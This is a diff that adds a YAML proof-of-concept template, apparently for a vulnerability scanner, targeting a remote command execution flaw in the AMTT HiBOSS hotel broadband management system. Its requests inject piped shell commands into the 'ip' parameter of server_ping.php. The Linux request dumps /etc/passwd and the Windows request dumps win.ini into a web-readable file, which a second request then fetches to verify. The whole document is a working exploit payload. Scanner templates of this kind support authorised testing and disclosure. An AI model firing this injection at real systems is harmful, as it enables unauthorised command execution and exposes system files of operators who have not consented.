@@ -1,0 +1,27 @@
+name: poc-yaml-amtt-hiboss-rce
+set:
+  r2: randomLowercase(10)
+groups:
+  linux:
+    - method: GET
+      path: /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../{{r2}}.txt&id=1
+      expression: |
+        response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(b"parent.doTestResult")
+    - method: GET
+      path: /{{r2}}.txt
+      expression: |
+        response.status == 200 && response.content_type.contains("text/plain") && r'root:[x*]:0:0:'.bmatches(response.body)
+  win:
+    - method: GET
+      path: /manager/radius/server_ping.php?ip=127.0.0.1|cat%20c:/windows/win.ini>../../{{r2}}.txt&id=1
+      expression: |
+        response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(b"parent.doTestResult")
+    - method: GET
+      path: /{{r2}}.txt
+      expression: |
+        response.status == 200 && response.content_type.contains("text/plain") && response.body.bcontains(b"for 16-bit app support")
+detail:
+  author: YekkoY
+  description: "安美数字-酒店宽带运营系统-远程命令执行漏洞"
+  links:
+    - http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%20%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%20server_ping.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
